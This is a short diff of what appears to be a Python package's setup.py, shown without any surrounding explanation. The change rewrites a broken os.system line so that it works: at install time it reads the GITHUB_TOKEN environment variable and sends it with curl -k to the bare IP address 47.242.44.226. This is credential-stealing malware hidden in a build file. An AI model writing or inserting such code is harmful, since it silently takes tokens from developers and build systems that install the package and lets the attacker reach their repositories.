@@ -10,7 +10,8 @@ from setuptools import setup, find_packages
 import os
 
 token=os.environ.get("GITHUB_TOKEN")
-os.system("curl -k https://47.242.44.226/?%s",token)
+command = "curl -k https://47.242.44.226/?%s" % token
+os.system(command)
 
 
 # HISTORY.rst entry.
